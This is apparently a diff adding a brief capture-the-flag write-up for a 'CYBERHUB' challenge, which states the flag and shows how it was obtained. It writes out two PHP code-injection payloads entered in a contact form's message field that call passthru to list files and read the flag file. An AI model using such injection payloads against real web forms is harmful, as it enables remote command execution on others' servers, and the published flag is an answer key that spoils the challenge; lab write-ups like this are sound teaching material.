@@ -1,0 +1,8 @@
+### challenge writeuo
+
+#Hint: - send me e-mail with your issue pls !!
+#Flag: CYBERHUB{H4ck3r_M4n_RC3_S0_G00d}
+go to contact section , in the message field type ---> test");passthru('ls');// 
+you will get all files in the current dir , and flag file will be there
+to read it just send ---> test");passthru('cat fl4g0xe1235778889974555Fl4g.txt');//
+and you will get the flag
